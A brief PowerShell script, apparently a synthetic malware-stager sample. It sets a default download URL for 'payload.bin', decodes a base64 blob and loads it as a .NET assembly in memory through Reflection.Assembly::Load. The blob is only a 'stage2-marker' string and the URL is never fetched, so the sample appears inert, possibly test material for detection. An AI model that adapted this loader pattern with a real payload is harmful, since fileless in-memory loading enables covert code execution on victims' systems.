[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://adatum.com:80/payload.bin",
    [int]$TimeoutSec = 19
)
$ErrorActionPreference = "Stop"

try {
    $StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo4NHlpZ3l1MGVi')
    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
    $TransferResult = [Reflection.Assembly]::Load($StageBytes)
    if ($null -ne $TransferResult) {
        Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Write-Verbose "stage marker 10 reached"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
